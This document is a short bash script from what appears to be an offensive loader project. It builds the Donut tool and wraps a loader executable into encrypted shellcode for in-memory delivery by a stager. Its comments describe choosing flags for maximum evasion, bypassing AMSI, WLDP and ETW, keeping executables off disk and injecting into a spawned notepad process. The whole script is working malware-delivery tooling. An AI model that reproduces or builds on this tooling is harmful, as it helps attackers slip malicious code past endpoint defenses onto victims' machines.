#!/usr/bin/env bash
# donut-wrap.sh — wrap build/loader.exe into a Donut-encrypted position-
# independent shellcode blob. Pair with build/stager.exe (`make stager`) to
# deliver the loader without any .exe hitting disk beyond the stager itself.
#
# Usage:  scripts/donut-wrap.sh [output.bin]
#   Defaults output path to build/loader.bin.
#   Clones + builds Donut into vendor/donut if it is not already there.

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOADER="$ROOT/build/loader.exe"
OUT="${1:-$ROOT/build/loader.bin}"
DONUT_DIR="${DONUT_DIR:-$ROOT/vendor/donut}"
DONUT_BIN="$DONUT_DIR/donut"

[[ -f "$LOADER" ]] || { echo "[-] $LOADER missing — run 'make release' first" >&2; exit 1; }

if [[ ! -x "$DONUT_BIN" ]]; then
    if [[ ! -d "$DONUT_DIR" ]]; then
        echo "[*] cloning donut -> $DONUT_DIR"
        mkdir -p "$(dirname "$DONUT_DIR")"
        git clone --depth 1 https://github.com/TheWover/donut.git "$DONUT_DIR"
    fi
    echo "[*] building donut"
    ( cd "$DONUT_DIR" && make >/dev/null )
fi

mkdir -p "$(dirname "$OUT")"

# Flags:
#   -a 2  amd64 only
#   -f 1  raw binary
#   -e 3  random names + symmetric encryption (default, max evasion)
#   -b 3  AMSI/WLDP/ETW bypass: continue on fail (our own primitive activates
#         once the loader PE runs; we don't need Donut's bypass to succeed)
#   -x 1  exit thread when done (default)
#   -z 2  aPLib compression (smaller blob)
# NOTE: no -t. The stager wants the loader to run synchronously in its thread
# so the stager process stays alive during injection; otherwise the
# in-process loader-thread dies with the stager before notepad is spawned.
"$DONUT_BIN" -i "$LOADER" -o "$OUT" -a 2 -f 1 -e 3 -b 3 -x 1 -z 2

sz=$(stat -c %s "$OUT")
sha=$(sha256sum "$OUT" | awk '{print $1}')
echo "[+] $OUT ($sz bytes, sha $sha)"
